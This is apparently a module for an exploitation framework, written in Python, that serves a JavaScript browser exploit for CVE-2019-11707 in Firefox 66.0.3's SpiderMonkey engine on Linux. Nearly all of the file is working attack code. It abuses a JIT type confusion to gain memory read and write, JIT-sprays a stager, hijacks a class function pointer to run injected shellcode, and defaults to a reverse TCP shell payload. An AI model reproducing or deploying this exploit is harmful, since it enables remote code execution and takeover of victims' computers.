from kittysploit import *

class Module(BrowserExploit):

	__info__ = {
		"name": "firefox 66.0.3",
		"description": "Exploit spidermonkey firefox 66.0.3",
		"cve": "2019-11707",
		"platform": Platform.LINUX,
		"arch": Arch.X64,
		"payload": {
			"default": "payloads/stagers/linux/x64/reverse_tcp",
			"category": PayloadCategory.STAGER,
			"arch": [Arch.X64],
			"platform": [Platform.LINUX]
			}
	}	
 
 
	def array_integer(self, shellcode):
		listToStr = ', '.join([str(elem) for elem in shellcode])
		return '[{}]'.format(listToStr)	
	
	def run(self):
		js = f"""
		String.prototype.rjust = function rjust(n,chr){{
		chr = chr || '0';
		if(this.length>n)
			return this.toString();
		return (chr.repeat(n)+this.toString()).slice(-1*n);
		}}
		String.prototype.ljust = function ljust(n,chr){{
		chr = chr || '0'
		if(this.length>n)
			return this.toString();
		return (this.toString()+chr.repeat(n)).slice(0,n);
		}}

		String.prototype.hexdecode = function hexdecode(){{
		inp=this.toString();
		if (this.length%2 !=0)
		inp='0'+inp.toString();
		out=[];
		for(var i=0;i<inp.length;i+=2)
		out.push(parseInt(inp.substr(i,2),16));
		return out;
		}}

		function print1(num){{
		rep="";
		for(var i=0;i<8;i++){{
			rep+=num[i].toString(16).rjust(2);
		}}
		console.log("0x"+rep.rjust(16));
		}}


		function data(inp){{
		bytes="";
		if ( (typeof inp) == 'string'){{
			inp=inp.replace("0x",'');
			inp=inp.rjust(16);
			bytes=new Uint8Array(inp.hexdecode());
		}}
		else if (typeof inp == 'number'){{
			bytes=new Uint8Array(new Float64Array([inp]).buffer);
			bytes.reverse();
		}}
		else if (typeof inp == 'object'){{
			bytes=new Uint8Array(8);
			bytes.set(inp);
			bytes.reverse();
		}}
		return bytes;
		}}

		function inttod(num){{
		num.reverse();
		temp = new Float64Array(num.buffer)[0];
		num.reverse();
		return temp;
		}}

		function dtoint(num){{
		int=new Uint32Array(new Float64Array([num]).buffer)
		// console.log(int[1].toString(16)+int[0].toString(16));
		return int;
		}}

		function RS(inp,amt){{
			amt = amt || 1;
			num="";
			for(var i=0;i<8;i++){{
			num+=inp[i].toString(2).rjust(8);
			}}
			num=num.slice(0,-1*amt);
			num=num.rjust(64);
			num=parseInt(num,2).toString(16).rjust(16);
			for(var i=0,j=0;i<num.length;i+=2,j++){{
			inp[j]=parseInt(num.substr(i,2),16);
			}}
			return inp;
		}}

		function LS(inp,amt){{
			amt = amt || 1;
			num='';
			for(var i=0;i<8;i++){{
			num+=inp[i].toString(2).rjust(8);
			}}
			num=num.slice(amt);
			num=num.ljust(64);
			num=parseInt(num,2).toString(16).rjust(16);
			for(var i=0,j=0;i<num.length;i+=2,j++){{
			inp[j]=parseInt(num.substr(i,2),16);
			}}
			return inp;
		}}

		function sub(inp1,inp2){{
			carry=0;
			for(var i=inp1.length-1;i>=0;i--){{
				diff=inp1[i]-inp2[i]-carry;
				carry=diff<0|0;
				inp1[i]=diff;
			}}
			return inp1;
		}}

		function add(inp1,inp2){{
			carry=0;
			for(var i=inp1.length-1;i>=0;i--){{
				sum=inp1[i]+inp2[i]+carry;
				carry=sum/0x100;
				inp1[i]=(sum%0x100);
			}}
			return inp1;
		}}	
		buf = [];
		buf.push(new ArrayBuffer(0x20));
		buf.push(new ArrayBuffer(0x20));
		buf.push(new ArrayBuffer(0x20));
		buf.push(new ArrayBuffer(0x20));
		buf.push(new ArrayBuffer(0x20));
		buf.push(new ArrayBuffer(0x20));
		buf.push(new ArrayBuffer(0x20));
		buf.push(new ArrayBuffer(0x20));
		buf.push(new ArrayBuffer(0x20));
		buf.push(new ArrayBuffer(0x20));	

		var abuf = buf[5];

		var e = new Uint32Array(abuf);
		const arr = [e, e, e, e, e];

		function vuln(a1) {{

			if (arr.length == 0) {{
				arr[3] = e;
			}}

			const v11 = arr.pop();


			v11[a1] = 0x80;

			for (let v15 = 0; v15 < 100000; v15++) {{}} // JIT compile this function
		}}

		p = [new Uint8Array(abuf), e, e];
		arr.__proto__ = p;

		for (let v31 = 0; v31 < 2000; v31++) {{
			vuln(18);
		}}

		leaker = new Uint8Array(buf[7]);
		aa = new Uint8Array(buf[6]);


		leak = aa.slice(0x50,0x58); // start of the Uint array
		group = aa.slice(0x40,0x48); // start of the array buffer
		slots = aa.slice(0x40,0x48);
		leak.reverse();
		group.reverse();
		slots.reverse();


		LS(group)
		LS(slots)

		/* remove the type tag */
		leak[0]=0;
		leak[1]=0;

		/* Get to the data buffer of the Uint array */
		add(leak,new data("0x38"))
		RS(leak)
		leak.reverse()

		for (var i=0;i<leak.length;i++)
		aa[0x40+i] = leak[i]

		leak.reverse()
		LS(leak)
		sub(leak,new data("0x10"))
		leak.reverse()

		changer = new Uint8Array(buf[7])

		function write(addr,value){{
			for (var i=0;i<8;i++)
			changer[i]=addr[i]
			value.reverse()
			for (var i=0;i<8;i++)
			leaker[i]=value[i]
		}}

		function read(addr){{
			for (var i=0;i<8;i++)
			changer[i]=addr[i]
			return leaker.slice(0,8)
		}}

		function read_n(addr, n){{
			write(leak,n)
			for (var i=0;i<8;i++)
			changer[i]=addr[i]
			return leaker
		}}

		sub(group,new data("0x40")) // this now points to the group member
		sub(slots,new data("0x30")) // this now points to the slots member
		print1(group)
		print1(slots)
		group.reverse()
		slots.reverse()

		aa = read(group) // aa now contains the group pointer
		aa.reverse()
		print1(aa)
		aa.reverse()

		grp_ptr = read(aa) // grp_ptr is now the clasp_ pointer
		grp_ptr.reverse()
		print1(grp_ptr)
		grp_ptr.reverse()

		/* stager shellode */
		buf[7].func = function func() {{
		const magic = 4.183559446463817e-216;

		const g1 = 1.4501798452584495e-277
		const g2 = 1.4499730218924257e-277
		const g3 = 1.4632559875735264e-277
		const g4 = 1.4364759325952765e-277
		const g5 = 1.450128571490163e-277
		const g6 = 1.4501798485024445e-277
		const g7 = 1.4345589835166586e-277
		const g8 = 1.616527814e-314
		}}

		/* JIT compile the shellcode */
		for (i=0;i<100000;i++) buf[7].func()

		slots_ptr = read(slots)
		slots_ptr.reverse()
		print1(slots_ptr)
		slots_ptr.reverse()

		func_ptr = read(slots_ptr)
		func_ptr[6]=0
		func_ptr[7]=0
		func_ptr.reverse()
		print1(func_ptr)
		func_ptr.reverse()

		func_ptr.reverse()

		add(func_ptr,new data("0x30"))
		func_ptr.reverse()

		func_ptr.reverse()
		print1(func_ptr)
		func_ptr.reverse()

		jit_ptr=read(func_ptr);
		jit_ptr.reverse()
		print1(jit_ptr)
		jit_ptr.reverse()

		jitaddr = read(jit_ptr);


		jitaddr[0]=0
		jitaddr[1]=jitaddr[1] & 0xf0

		jitaddr.reverse()
		print1(jitaddr)
		jitaddr.reverse()

		jitaddr.reverse()
		sub(jitaddr,new data("0xff0"))
		jitaddr.reverse()

		for(j=0;j<3;j++){{
		asdf = read_n(jitaddr,new data("0xff0"))
		offset=-1;
		for (var i =0;i<0xff0;i++)
		{{
			if (asdf[i]==0x37 && asdf[i+1]==0x13 && asdf[i+2]==0x37 && asdf[i+3]==0x13 && asdf[i+4]==0x37 && asdf[i+5]==0x13 && asdf[i+6]==0x37 && asdf[i+7]==0x13){{
			offset=i;
			break
			}}
		}}

		/* we found the shellcode */
		if(offset!=-1)
			break

		jitaddr.reverse()
		add(jitaddr,new data("0xff0"))
		jitaddr.reverse()
		}}

		offset = offset+8+6 // add the offset of the magic constant and also the mov instruction
		jitaddr.reverse()
		add(jitaddr,new data(offset.toString(16)))
		jitaddr.reverse()
		console.log(offset);

		/* JS Class object */
		jsClass = read_n(grp_ptr,new data("0x30"));

		name = jsClass.slice(0,8)
		flags = jsClass.slice(8,16)
		cOps = jsClass.slice(16,24)
		spec = jsClass.slice(24,32)
		ext = jsClass.slice(40,48)
		oOps = jsClass.slice(56,64)

		group.reverse()
		add(group,new data("0x60"))
		group.reverse()

		eight = new data("0x8")

		function addEight()
		{{
		group.reverse()
		add(group,eight)
		group.reverse()
		}}

		/* Lol, can I get more lazier :).... */
		function write1(addr,value){{
			for (var i=0;i<8;i++)
			changer[i]=addr[i]
			// value.reverse()
			for (var i=0;i<8;i++)
			leaker[i]=value[i]
		}}

		/* We will be writting our crafted group to this address. So we save it now*/
		backingbuffer = group.slice(0,8)

		oops = group.slice(0,8)
		oops.reverse()
		add(oops,new data("0x30"))
		oops.reverse()

		write1(group,name)
		addEight()
		write1(group,flags)
		addEight()
		write1(group,oops)
		addEight()
		write1(group,spec)
		addEight()
		write1(group,ext)
		addEight()
		write1(group,oOps)
		addEight()

		/* set the addProperty function pointer to our shellcode */
		write1(group,jitaddr)

		sc_buffer = new Uint8Array(0x1000);
		buf[7].asdf=sc_buffer

		/* Leak the address of the shellcode UnitArray */
		slots_ptr.reverse()
		add(slots_ptr,eight)
		slots_ptr.reverse()

		sc_buffer_addr = read(slots_ptr)
		sc_buffer_addr[6]=0
		sc_buffer_addr[7]=0

		/* Now get to the buffer of the shellcode array */
		sc_buffer_addr.reverse()
		add(sc_buffer_addr,new data("0x38"))
		sc_buffer_addr.reverse()

		/* ptr is the pointer to the shellcode (currenty it's rw) */
		ptr = read(sc_buffer_addr)

		ptr.reverse()
		print1(ptr)
		ptr.reverse()

		/* convert the pointer to the shellcode buffer to float */
		ptr.reverse()
		ss=inttod(ptr)
		ptr.reverse()

		sc = {self.array_integer(self.payload)};
  		for(var i=0;i<sc.length;i++)
		sc_buffer[i]=sc[i]

		write1(aa,backingbuffer)

		buf[7].jjj=ss
		"""
		return self.send_js(js)
